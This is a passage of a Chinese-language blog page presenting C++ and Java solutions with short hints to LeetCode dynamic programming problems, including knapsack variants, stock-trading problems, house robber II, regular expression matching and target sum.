class="keyword">return</span> dp[w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/partition-equal-subset-sum">分割等和子集</a><br>给你一个只包含正整数的非空数组nums。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sum % <span class="number">2</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> target = sum / <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> weight = nums[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = target; j &gt;= weight; --j) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + weight);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] == target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意这道题没有value且要知道背包的容量为sum&#x2F;2。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/ones-and-zeroes">一和零</a><br>给定m个数字0和n个数字1，以及一些由0-1构成的字符串，求利用这些数字最多可以构成多少个给定的字符串，字符串只可以构成一次。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = strs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">weights0</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">weights1</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : strs[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span>) ++weights0[i];</span><br><span class="line">                <span class="keyword">else</span> ++weights1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= weights0[i]; --j) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = n; k &gt;= weights1[i]; --k) &#123;</span><br><span class="line">                    dp[j][k] = <span class="built_in">max</span>(dp[j][k], dp[j - weights0[i]][k - weights1[i]] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上是一个双重背包。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/coin-change">零钱交换</a><br>给定一些硬币的面额，求最少可以用多少颗硬币组成给定的金额，硬币可以重复使用。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount + <span class="number">1</span>, <span class="number">10001</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; coins.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = coins[i]; j &lt;= amount; ++j) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j], dp[j - coins[i]] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount] == <span class="number">10001</span> ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很典型的无限背包问题。</p></li></ul><h2 id="六、股票问题"><a href="#六、股票问题" class="headerlink" title="六、股票问题"></a>六、股票问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock">买卖股票的最佳时机</a><br>给定一段时间内每天某只股票的固定价格，已知你只可以买卖各一次，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> minSale = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; minSale) minSale = prices[i];</span><br><span class="line">            <span class="keyword">else</span> res = <span class="built_in">max</span>(res, prices[i] - minSale);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题，使用贪心思想即可。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iv">买卖股票的最佳时机 IV</a><br>给定一段时间内每天某只股票的固定价格，已知你只可以买卖各k次，且每次只能拥有一支股票，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(<span class="type">int</span> k, vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(k + <span class="number">1</span>, <span class="number">-1001</span>)</span>, <span class="title">sell</span><span class="params">(k + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; prices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= k; ++j) &#123;</span><br><span class="line">                buy[j] = <span class="built_in">max</span>(buy[j], sell[j - <span class="number">1</span>] - prices[i]);</span><br><span class="line">                sell[j] = <span class="built_in">max</span>(sell[j], buy[j] + prices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要用两个数组来维护状态，思考一下状态转换的关系。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-cooldown">买卖股票的最佳时机含冷冻期</a><br>给定一段时间内每天某只股票的固定价格，已知每次卖出之后必须冷却一天，且每次只能拥有一支股票，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(n)</span>, <span class="title">sell</span><span class="params">(n)</span>, <span class="title">s1</span><span class="params">(n)</span>, <span class="title">s2</span><span class="params">(n)</span></span>;</span><br><span class="line">        s1[<span class="number">0</span>] = buy[<span class="number">0</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        sell[<span class="number">0</span>] = s2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            buy[i] = s2[i - <span class="number">1</span>] - prices[i];</span><br><span class="line">            s1[i] = <span class="built_in">max</span>(buy[i - <span class="number">1</span>], s1[i - <span class="number">1</span>]);</span><br><span class="line">            sell[i] = <span class="built_in">max</span>(buy[i - <span class="number">1</span>], s1[i - <span class="number">1</span>]) + prices[i];</span><br><span class="line">            s2[i] = <span class="built_in">max</span>(s2[i - <span class="number">1</span>], sell[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(sell[n - <span class="number">1</span>], s2[n - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：考虑如下状态转换图，这道题还有二维dp的做法，二维dp的做法也可以被压缩成一维dp的做法。<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.5-91923e38e2992faf249854d49cd28aa0.png" alt="状态转换图"></p></li></ul><h2 id="七、练习"><a href="#七、练习" class="headerlink" title="七、练习"></a>七、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/house-robber-ii">打家劫舍 II</a><br>你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都围成一圈，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> prev = <span class="number">0</span>, pevPrev = <span class="number">0</span>, cur1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            cur1 = <span class="built_in">max</span>(pevPrev + nums[i], prev);</span><br><span class="line">            pevPrev = prev;</span><br><span class="line">            prev = cur1;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = <span class="number">0</span>, pevPrev = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cur2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            cur2 = <span class="built_in">max</span>(pevPrev + nums[i], prev);</span><br><span class="line">            pevPrev = prev;</span><br><span class="line">            prev = cur2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(cur1, cur2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：处理一下首尾，分开算一遍即可。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/maximum-subarray">最大子数组和</a><br>给你一个整数数组nums，请你找出一个具有最大和的连续子数组(子数组最少包含一个元素)，返回其最大和。</p><p>解答：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i ++) &#123;</span><br><span class="line">            pre = Math.max(pre + nums[i], nums[i]);</span><br><span class="line">            res = Math.max(pre, res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：要么加入当前的，要么重新从当前的重新开始。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/integer-break">整数拆分</a><br>给定一个正整数n，将其拆分为k个正整数的和(k&gt;&#x3D;2)，并使这些整数的乘积最大化。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt; i; ++j) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], j * dp[i - j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：分割类型的问题。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/delete-operation-for-two-strings">两个字符串的删除操作</a><br>给定两个单词word1和word2，返回使得word1和word2相同所需的最小步数。每步可以删除任意一个字符串中的一个字符。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = word<span class="number">1.l</span>ength(), n = word<span class="number">2.l</span>ength();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = j;</span><br><span class="line">                <span class="keyword">if</span> (word1[i - <span class="number">1</span>] == word2[j - <span class="number">1</span>]) dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> dp[i][j] = <span class="built_in">min</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：最长公共子序列的变种题，注意i和j为0时的赋值。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/regular-expression-matching">正则表达式匹配</a><br>给你一个字符串s和一个字符规律p，请你来实现一个支持’.’和’*’的正则表达式匹配。</p><ul><li>‘.’匹配任意单个字符。</li><li>‘*’匹配零个或多个前面的那一个元素。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">length</span>(), n = p.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n + <span class="number">1</span>, <span class="literal">false</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p[j - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i][j] || dp[i][j - <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (p[j - <span class="number">2</span>] == s[i - <span class="number">1</span>] || p[j - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">                        dp[i][j] = dp[i][j] || dp[i - <span class="number">1</span>][j];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (p[j - <span class="number">1</span>] == s[i - <span class="number">1</span>] || p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                       dp[i][j] = dp[i][j] || dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常麻烦的题，i&#x3D;0是为了处理p的开头两个就有’*‘的情况，而当p[j]&#x3D;’*‘时，本质上只会有两种情况：匹配s末尾的一个字符，将该字符扔掉，而该组合还可以继续进行匹配；不匹配字符，将该组合扔掉，不再进行匹配。如果仍然不太理解的话，可以考虑用for循环处理。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/target-sum">目标和</a><br>给你一个非负整数数组nums和一个整数target。向数组中的每个整数前添加’+’或’-‘，然后串联起所有整数，可以构造一个表达式(例如’+2-1’)。<br>返回可以通过上述方法构造的、运算结果等于target的不同表达式的数目。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTargetSumWays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> diff = sum - target;</span><br><span class="line">        <span class="keyword">if</span> (diff &lt; <span class="number">0</span> || diff % <span class="number">2</span> != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> neg = (sum - target) / <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(neg + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = neg; j &gt;= nums[i]; --j) &#123;</span><br><span class="line">                dp[j] = dp[j] + dp[j - nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[neg];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上是一个0-1背包问题，设有neg个数字取负，则有sum-neg-neg&#x3D;target，剩下的就是选取元素之和为neg的元素排列个数了。</p></li><li><p>题目七：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-transaction-fee">买卖股票的最佳时机含手续费</a><br>给定一个整数数组prices，其中prices[i]表示第i天的股票价格；整数fee代表了交易股票的手续费用。<br>你可以无限次地完成交易，但是你每笔交易都需要付手续费。如果你已经购买了一个股票，在卖出它之前你就不能再继续购买股票了。<br>返回获得利润的最大值。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;prices, <span class="type">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>, dp[<span class="number">1</span>] = -prices[<span class="number">0</span>], dp[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            dp[<span class="number">0</span>] = <span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">2</span>]);</span><br><span class="line">            dp[<span class="number">1</span>] = <span class="built_in">max</span>(dp[<span class="number">1</span>], <span class="built_in">max</span>(dp[<span class="number">0</span>] - prices[i], dp[<span class="number">2</span>] - prices[i]));</span><br><span class="line">            dp[<span class="number">2</span>] = <span class="built_in">max</span>(dp[<span class="number">2</span>], dp[<span class="number">1</span>] + prices[i] - fee);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> 